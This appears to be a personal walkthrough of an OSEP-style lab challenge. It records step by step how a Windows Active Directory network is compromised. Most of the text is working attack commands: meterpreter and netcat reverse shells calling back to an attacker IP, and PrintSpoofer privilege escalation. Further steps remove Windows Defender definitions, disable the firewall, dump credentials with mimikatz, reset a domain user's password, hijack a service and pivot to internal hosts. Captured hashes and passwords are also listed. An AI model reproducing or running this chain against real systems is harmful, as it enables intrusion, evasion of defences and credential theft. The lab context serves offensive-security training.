# Challenge 6

## Hosts

### External

192.168.100.181

192.168.100.189

### Internal

172.16.100.180

172.16.100.188

172.16.100.187

172.16.100.184

172.16.100.183

172.16.100.192

172.16.100.194

172.16.100.197

## web05

{% code overflow="wrap" %}
```powershell
# Connect to development host
remmina rdp://192.168.x.100
# Map network drive
net use x: \\192.168.49.204\visualstudio /user:kali @WSX2wsx
# Open "X:\OSEP\EncryptedShellCodeRunnerHelper\EncryptedShellCodeRunnerHelper.sln"
# Craft Malicious ASPX shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.204 LPORT=443 -f csharp
# Paste shellcode into EncryptedShellCodeRunnerHelper
# Execute binary
X:\OSEP\EncryptedShellCodeRunnerHelper\EncryptedShellCodeRunnerHelper\bin\x64\Release\EncryptedShellCodeRunnerHelper.exe
# Meterpreter reverse shell
use exploit/multi/handler
set lport 443
set payload windows/x64/meterpreter/reverse_https
run
# Upload shell at
http://192.168.100.181/
# Navigate to shell to activate it
192.168.100.181/met.aspx

# Start notepad as a process to migrate into
execute -H -f notepad
# Migrate into notepad process
ps
migrate 1088
shell
# Get flag
cd inetpub
type local.txt
e1f242b2cebc0c6cb79193288d703462
# Create network share and copy across needed files
cd \windows\tasks
net use x: \\192.168.49.204\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\SpoolSample.exe
copy X:\OSEP\PrintSpooferNet\PrintSpooferNet\bin\x64\Release\PrintSpooferNet.exe
copy X:\OSEP\ActiveDirectoryExploitation\nc64.exe
copy X:\OSEP\ActiveDirectoryExploitation\adPEAS.ps1
copy X:\OSEP\ActiveDirectoryExploitation\PowerView.ps1
copy X:\OSEP\ActiveDirectoryExploitation\SharpHound.exe
copy X:\OSEP\ActiveDirectoryExploitation\HostRecon.ps1

# Run HostRecon
gc -raw .\HostRecon.ps1 | iex
Invoke-HostRecon
# Start additional shells to carry out the PrintSpoolerNet attack
start /b nc64.exe -e cmd.exe 192.168.49.204 4445

# Privesc
# Creating the pipe server as Network Service account
PrintSpoofer.exe \\.\pipe\test\pipe\spoolss "c:\windows\tasks\nc64.exe -e cmd.exe 192.168.49.204 4446"
# Invoke SpoolSample with forward slash
.\SpoolSample.exe web05 web05/pipe/test

# Dump hashes
# Remove Windows Defender definitions
cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
# Disable Firewall
NetSh Advfirewall set allprofiles state off
# Map drive and copy mimikatz
cd \windows\tasks
net use x: \\192.168.49.204\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\mimikatz.exe
copy X:\OSEP\ActiveDirectoryExploitation\mimidrv.sys
# Run mimikatz
mimikatz.exe
# Dump 
sekurlsa::logonpasswords
lsadump::secrets
```
{% endcode %}

## Found Credentials

```
adminWebSvc:b0df1cb0819ca0b7d476d4c868175b94
Administrator:9689cee5c72d2ef437de593af89bb4ff
adminWebSvc@final.com:FGjksdff89sdfj
```

## Domain Enumeration

{% code overflow="wrap" %}
```powershell
# Run adPEAS
powershell
gc -raw .\adPEAS.ps1 | iex
Invoke-adPEAS

Domain Name             : final.com
Domain SID              : S-1-5-21-1725955968-4040474791-670206374
Domain Functional Level : Windows 2016
Forest Name             : final.com
Forest Children         : {dev.final.com}
Domain Controller       : dc01.final.com
DC Host Name  : dc01.final.com
DC IP Address : 172.16.204.180
Checking Domain Trusts - Details for Domain 'final.com':
Target Domain Name : dev.final.com
Kerberoastable
sqlsvc03, sqlsvc11


.\SharpHound.exe -c all -d final.com
.\SharpHound.exe -c all -d dev.final.com

# User adminWebSvc@final.com can reset nina's password. 

$SecPassword = ConvertTo-SecureString 'FGjksdff89sdfj' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('final.com\adminWebSvc', $SecPassword)

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential $Cred
```
{% endcode %}

## jump03

{% code overflow="wrap" %}
```powershell

net use x: \\192.168.49.204\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\winpeas.exe
copy X:\OSEP\ActiveDirectoryExploitation\winPEASany_ofs.exe
# Add registry key for colour
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
# Privesc
# Add below code to adduser.c
#include <stdlib.h>
int main ()
{
int i;
    i = system("net localgroup administrators nina /add");
return 0;
}
# Compile code
i686-w64-mingw32-gcc adduser.c -lws2_32 -o add.exe
# Copy to target
copy X:\OSEP\ActiveDirectoryExploitation\add.exe
# Modify service
sc config SNMPTRAP binpath= "Ccmdkey/:\Temp\adduser.exe"
# Start service
net start snmptrap

# Remove Windows Defender definitions
cd C:\Program Files\Windows Defender
.\MpCmdRun.exe -removedefinitions -all
# Disable Firewall
NetSh Advfirewall set allprofiles state off
net use x: \\192.168.49.204\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\mimikatz.exe
copy X:\OSEP\ActiveDirectoryExploitation\shell2.exe
# Run mimikatz
mimikatz.exe
# Increase privileges
privilege::debug
# Dump 
sekurlsa::logonpasswords
lsadump::secrets
```
{% endcode %}

## Found passwords

```
tommy:89dsfsji43A

```

## Setup Pivot

```bash
use post/multi/manage/autoroute
set SUBNET 172.16.204.0
set session 2

use auxiliary/server/socks_proxy
set SRVPORT 1080
set SRVHOST 127.0.0.1
set version 4a
run -j
```

## ansible06

```bash
# Connect to host
proxychains ssh -i tommy_key tommy@final.com@172.16.204.184
# Privesc
sudo lua -e 'os.execute("/bin/sh")'
# Found ansible server
appserver05.dev.final.com
# Change to ansible user account
su ansiblesvc
# ssh to appserver05.dev.final.com
ssh ansiblesvc@appserver05.dev.final.com
```

## sql03

{% code overflow="wrap" %}
```bash

proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py tommy:89dsfsji43A@172.16.204.187 -port 1433 -windows-auth

proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py tommy:89dsfsji43A@172.16.204.188 -port 1433 -windows-auth
```
{% endcode %}
